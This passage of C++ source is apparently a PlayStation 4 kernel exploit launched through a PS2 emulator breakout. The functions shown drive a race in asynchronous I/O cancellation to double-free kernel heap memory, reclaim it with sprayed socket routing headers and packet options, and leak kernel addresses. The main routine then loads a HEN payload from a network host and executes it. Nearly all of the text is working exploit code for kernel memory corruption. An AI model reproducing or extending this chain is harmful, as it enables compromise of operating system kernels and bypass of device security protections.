    *((uint64_t*)&reqs2->ar2_qentry + 2) = 1; // 0x60

    printf_debug("ar3:\n");
    hexdump((uint8_t *)reqs2, 0x80);

    printf_debug("* Start overwrite AIO queue entry with rthdr loop\n");

    SceKernelAioSubmitId req_id = 0;
    PS::close(rthdr_sds[0]);
    rthdr_sds[0] = -1;

    for (uint32_t i = 0; i < NUM_ALIAS; i++)
    {
        for (uint32_t j = 0; j < NUM_SDS; j++)
        {
            if (setup_data.sds[j] < 0) continue; // Skip invalid sockets
            set_rthdr(setup_data.sds[j], &rthdr, rthdr.used_size);
        }

        for (uint32_t j = 0; j < MAX_REQS * NUM_BATCHES; j += MAX_REQS)
        {
            for (uint32_t k = 0; k < MAX_REQS; k++) states[k] = -1;
            aio_multi_cancel(&ids[j], MAX_REQS, states);

            int32_t req_idx = -1;
            for (int32_t k = 0; k < MAX_REQS; k++)
            {
                if (states[k] != SCE_KERNEL_AIO_STATE_COMPLETED) continue;
                req_idx = k;
                break;
            }
            if (req_idx < 0) continue;

            printf_debug("req_idx: %d\n", req_idx);
            printf_debug("found req_id at batch: %d\n", j / MAX_REQS);
            printf_debug("states: ");
            for (uint32_t k = 0; k < MAX_REQS; k++)
                printf_debug("%08x ", states[k]);
            printf_debug("\n");
            printf_debug("states[%d]: %08x\n", req_idx, states[req_idx]);
            printf_debug("aliased at attempt: %d\n", i);

            req_id = ids[j + req_idx];
            ids[j + req_idx] = 0;
            printf_debug("req_id: %p\n", req_id);

            // set .ar3_done to 1
            aio_multi_poll(&req_id, 1, aio_errs);
            printf_debug("aio_multi_poll errs[0] %08x\n", aio_errs[0]);

            for (uint32_t k = 0; k < NUM_SDS; k++)
            {
                if (setup_data.sds[k] < 0) continue; // Skip invalid sockets
                socklen_t len = rthdr.used_size;
                get_rthdr(setup_data.sds[k], &rthdr, &len);
                // .ar3_done
                if (*((uint32_t*)&reqs2->ar2_result.returnValue + 1) == 1)
                {
                    hexdump((uint8_t *)&rthdr, 0x80);
                    dirty_sd = setup_data.sds[k];
                    setup_data.sds[k] = -1;
                    free_rthdrs(setup_data.sds, NUM_SDS);
                    break;
                }
            }

            if (dirty_sd < 0)
            {
                printf_debug("Cannot find sd that overwrote AIO queue entry!\n");
                return -1;
            }
            printf_debug("dirty_sd: %d\n", dirty_sd);
            goto loop_break;
        }
    }
    loop_break:

    if (!req_id)
    {
        printf_debug("Failed to overwrite AIO queue entry!\n");
        return -1;
    }

    free_aios2(ids, MAX_REQS * NUM_BATCHES);

    // Enable deletion of target_id
    aio_multi_poll(&stage2_data.target_id, 1, aio_errs);
    printf_debug("target's state: %08x\n", aio_errs[0]);

    SceKernelAioError errs[2] = {-1, -1};
    SceKernelAioSubmitId target_ids[2] = {req_id, stage2_data.target_id};
    
    // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
    aio_multi_delete(target_ids, 2, errs);

    // We reclaim first since the sanity checking here is longer which makes it
    // more likely that we have another process claim the memory

    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    err = make_aliased_pktopts();
    if (err) return err;

    printf_debug("Delete errors: %08x, %08x\n", errs[0], errs[1]);

    states[0] = -1;
    states[1] = -1;
    aio_multi_poll(target_ids, 2, states);
    printf_debug("target states: %08x, %08x\n", states[0], states[1]);

    bool success = true;
    if (states[0] != SCE_KERNEL_ERROR_ESRCH) {
        printf_debug("ERROR: bad delete of corrupt AIO request\n");
        success = false;
    }
    if (errs[0] != 0 || errs[0] != errs[1]) {
        printf_debug("ERROR: bad delete of ID pair\n");
        success = false;
    }

    if (!success)
    {
        printf_debug("ERROR: double free on a 0x100 malloc zone failed\n");
        return -1;
    }
    return 0;
}

void cleanup()
{
    // Close unix socketpair
    PS::close(setup_data.unixpair.unblock_fd);
    PS::close(setup_data.unixpair.block_fd);

    // Free worker AIOs
    free_aios(&setup_data.worker_id, 1);

    // Free test AIO
    if (setup_data.test_id != 0)
        free_aios(&setup_data.test_id, 1);

    // Close all sprayed sockets
    for (uint32_t i = 0; i < NUM_SDS; i++)
        if (setup_data.sds[i] >= 0)
            PS::close(setup_data.sds[i]);
    
    // Free groomed AIOs
    free_aios2(setup_data.groom_ids, NUM_GROOM_IDS);

    // Close sd_listen
    if (sd_listen > 0) PS::close(sd_listen);

    // Destroy the pthread barrier
    if (barrier != 0) scePthreadBarrierDestroy(&barrier);

    // Close rthdr_sds[0]
    if (rthdr_sds[0] > 0) PS::close(rthdr_sds[0]);
}

void main()
{
    // PS2 Breakout
    PS::Breakout::init();

    // Attempt to connect to debug server
    PS::Debug.connect(IP(192, 168, 1, 37), 9023);

    // HELLO EVERYNYAN!
    Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
    printf_debug("HELL%d\nEVERYNYAN!\n", 0);

    // Initialize syscall wrappers
    syscall_init();

    // STAGE 0: Setup
    if (setup() != 0) goto end;

    // STAGE 1: Double free AIO queue entry
    if (double_free_reqs() != 0) goto end;

    // STAGE 2: Leak kernel addresses
    if (leak_kernel_addrs() != 0) goto end;

    // STAGE 3: Double free SceKernelAioRWRequest
    if (double_free_reqs1() != 0) goto end;

    end:
        cleanup();
        if (err != 0)
        {
            printf_debug("Something went wrong! Error: %d\n", err);
            PS::Breakout::restore(); // Restore corruption
        }
        else
        {
            printf_debug("Success!\n");
            // Load HEN vtx payload [5.05-12.02]
            // Big thanks to EchoStretch for this hen-vtx!
            char* payload;
            size_t payload_size;        
            char buffer[256];
            snprintf(buffer, sizeof(buffer), "Running %s", payload);
            printf_debug(buffer);
            if (load_payload_from_host("ps4-hen-1202-vtx.bin",&payload,payload_size)) {
                execute_payload(payload, payload_size);
                printf_debug("Payload executed successfully.\n");
            } else {
                printf_debug("Failed to load payload!\n");
            }
            while (true) cycle_pad_colors();
        }
}
